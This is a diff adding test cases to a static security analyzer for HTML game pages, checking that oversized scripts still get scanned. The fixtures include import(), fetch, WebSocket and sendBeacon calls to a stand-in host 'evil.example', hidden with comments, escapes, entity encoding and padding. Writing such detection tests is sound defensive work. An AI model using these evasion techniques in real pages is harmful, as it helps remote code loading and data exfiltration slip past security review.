@@ -250,3 +250,124 @@ describe('top-navigation: parent.postMessage is not navigation', () => {
       assert.equal(level(analyzeGame(`<canvas></canvas><script>${js}</script>`), 'top-navigation'), 'warn', js);
   });
 });
+
+describe('SP-4 QA: budget-skipped files cannot slip past the text-scan fallback', () => {
+  const MB2 = 1024 * 1024;
+  const PAD = 'var a=b+c*d(e,f);'.repeat(Math.ceil((1.4 * MB2) / 17)); // > AST_BUDGET.maxJsBytes on its own
+  const EVIL = 'https://evil.example/x.js';
+  const page = (js: string, attrs = '') => `<canvas></canvas><script${attrs}>${PAD}\n${js}</script>`;
+  const deep = (r: StaticReport) => level(r, 'deep-analysis');
+  const scriptFail = (html: string, why: string) => {
+    const r = analyzeGame(html);
+    assert.equal(deep(r), 'warn', `${why}: budget should be exceeded`);
+    assert.equal(level(r, 'script-hosts'), 'fail', `${why}: ${JSON.stringify(findings(r, 'script-hosts'))}`);
+    return r;
+  };
+
+  it('more than 130k import strings in a skipped file: no RangeError, fails closed', () => {
+    const many = "import'./a';".repeat(140_000); // 1.68 MB, over the byte budget
+    let r: StaticReport | undefined;
+    assert.doesNotThrow(() => { r = analyzeGame(`<canvas></canvas><script type="module">${many}</script>`); });
+    assert.equal(level(r!, 'script-hosts'), 'fail');
+    assert.ok(findings(r!, 'script-hosts').length <= 10);
+    const r2 = analyzeGame(`<canvas></canvas><script>${"x=import('./a');".repeat(140_000)}</script>`);
+    assert.equal(level(r2, 'script-hosts'), 'fail');
+  });
+
+  const COMMENT_CASES: [string, string][] = [
+    ['import/*c*/(url)', `import/*c*/('${EVIL}')`],
+    ['import(//c\\n url)', `import(//c\n'${EVIL}')`],
+    ['import x from/*c*/url', `import x from/*c*/'${EVIL}'`],
+    ['import/*c*/url', `import/*c*/'${EVIL}'`],
+    ['export*from/*c*/url', `export*from/*c*/'${EVIL}'`],
+    ['escaped slashes \\/', `import('https:\\/\\/evil.example\\/x.js')`],
+    ['\\xNN escapes', `import('\\x68ttps://evil\\x2eexample/x.js')`],
+    ['\\uNNNN escapes', `import('\\u0068ttps://evil.example/x.js')`],
+    ['newline padding', `import\n\n(\n'${EVIL}'\n)`],
+  ];
+  for (const [name, js] of COMMENT_CASES) {
+    it(`catches ${name} after the budget`, () => {
+      const r = scriptFail(page(js, js.includes('export') || js.includes(' from') || js.startsWith('import/*c*/\'') ? ' type="module"' : ''), name);
+      assert.ok(findings(r, 'script-hosts').some((f) => f.includes('evil.example')), JSON.stringify(findings(r, 'script-hosts')));
+    });
+  }
+
+  it('catches import() inside inline event handlers (plain and entity-encoded) after the budget', () => {
+    scriptFail(`<canvas onclick="import('${EVIL}')"></canvas><script>${PAD}</script>`, 'handler');
+    scriptFail(`<canvas onclick="import(&quot;https:&#x2F;&#x2F;evil.example/x.js&quot;)"></canvas><script>${PAD}</script>`, 'entity handler');
+    scriptFail(`<canvas onclick="import(/*c*/'${EVIL}')"></canvas><script>${PAD}</script>`, 'handler comment');
+  });
+
+  it('fails closed on imports it cannot resolve once the budget is hit', () => {
+    for (const js of ["import(base + 'x.js')", 'import(u)', 'import(`${cdn}/x.js`)', 'const f = `${import(u)}`;', `import('${'a'.repeat(5000)}')`]) {
+      const r = scriptFail(page(js), js.slice(0, 30));
+      assert.ok(findings(r, 'script-hosts').some((f) => f.startsWith('unresolved:')), js.slice(0, 30));
+    }
+  });
+
+  it('does not invent findings from comments or strings', () => {
+    const js = `// import('${EVIL}')\n/* fetch('${EVIL}') */ var s = "import(x) fetch('${EVIL}') eval(1) alert(1) top.location";`;
+    const r = analyzeGame(page(js));
+    assert.equal(deep(r), 'warn');
+    assert.equal(level(r, 'script-hosts'), 'pass', JSON.stringify(findings(r, 'script-hosts')));
+    for (const id of ['network', 'eval', 'dialogs', 'top-navigation']) assert.equal(level(r, id), 'pass', id);
+  });
+
+  it('allowlisted imports after the budget still pass', () => {
+    const r = analyzeGame(page("import('https://cdn.jsdelivr.net/npm/three/+esm')"));
+    assert.equal(deep(r), 'warn');
+    assert.equal(level(r, 'script-hosts'), 'pass');
+  });
+
+  it('a syntax error in a small script stays a fail when another script blows the budget', () => {
+    const r = analyzeGame(`<canvas></canvas><script>let = ;</script><script>${PAD}</script>`);
+    assert.equal(deep(r), 'warn');
+    assert.equal(level(r, 'js-syntax'), 'fail');
+    const r2 = analyzeGame(`<canvas></canvas><script>${PAD}</script><script>function(</script>`);
+    assert.equal(level(r2, 'js-syntax'), 'fail');
+  });
+
+  it('eval, popups, top-navigation and dialogs keep their warning when skipped', () => {
+    const cases: Record<string, string> = {
+      eval: 'eval(/*c*/"1")', popups: 'window . open("x")', 'top-navigation': 'top /*c*/ .location = "x"', dialogs: 'alert//c\n(1)',
+    };
+    for (const [id, js] of Object.entries(cases)) {
+      const r = analyzeGame(page(js));
+      assert.equal(deep(r), 'warn', id);
+      assert.equal(level(r, id), 'warn', `${id}: ${JSON.stringify(r.checks.find((c) => c.id === id))}`);
+    }
+    // Same in a small script that was parsed before the big one ran out the budget.
+    const r = analyzeGame(`<canvas></canvas><script>eval("1");alert(1)</script><script>${PAD}</script>`);
+    assert.equal(level(r, 'eval'), 'warn');
+    assert.equal(level(r, 'dialogs'), 'warn');
+  });
+
+  it('flags fetch / WebSocket / sendBeacon to bad hosts after the padding', () => {
+    for (const js of [`fetch( /*c*/ 'https://evil.example/api')`, `fetch('https:\\/\\/evil.example/api')`, `new WebSocket("wss://evil.example/s")`, `navigator.sendBeacon('https://evil.example/b', d)`, `xhr.open('GET', 'https://evil.example/x')`]) {
+      const r = analyzeGame(page(js));
+      assert.equal(level(r, 'network'), 'warn', js);
+      assert.ok(findings(r, 'network').some((f) => f.includes('evil.example')), js);
+    }
+    assert.equal(level(analyzeGame(page("fetch('https://cdn.jsdelivr.net/x.json')")), 'network'), 'pass');
+  });
+
+  it('flags parent["location"]= (AST and text scan)', () => {
+    for (const js of ['parent["location"] = "x"', "top['location'].href='x'", 'window.parent["document"]'])
+      assert.equal(level(analyzeGame(`<canvas></canvas><script>${js}</script>`), 'top-navigation'), 'warn', js);
+    assert.equal(level(analyzeGame(page('parent [ "location" ] = "x"')), 'top-navigation'), 'warn');
+    assert.equal(level(analyzeGame('<canvas></canvas><script>parent["postMessage"](1,"*")</script>'), 'top-navigation'), 'pass');
+  });
+
+  it('entity-encoded attribute URLs are decoded before the host check (no budget needed)', () => {
+    const r = analyzeGame('<canvas></canvas><script src="https:&#x2F;&#x2F;evil.example/a.js"></script>');
+    assert.ok(findings(r, 'script-hosts').includes('https://evil.example/a.js'));
+  });
+
+  it('the whole fallback stays well under 1 s at 4.9 MB', () => {
+    const big = `<canvas></canvas><script>${'var a=b+c*d(e,f);/*x*/"s\\x41";'.repeat(Math.floor((4.9 * MB2) / 32))}</script>`;
+    const t0 = performance.now();
+    analyzeGame(big);
+    const ms = performance.now() - t0;
+    assert.ok(ms < 1000, `${ms.toFixed(0)} ms`);
+  });
+});
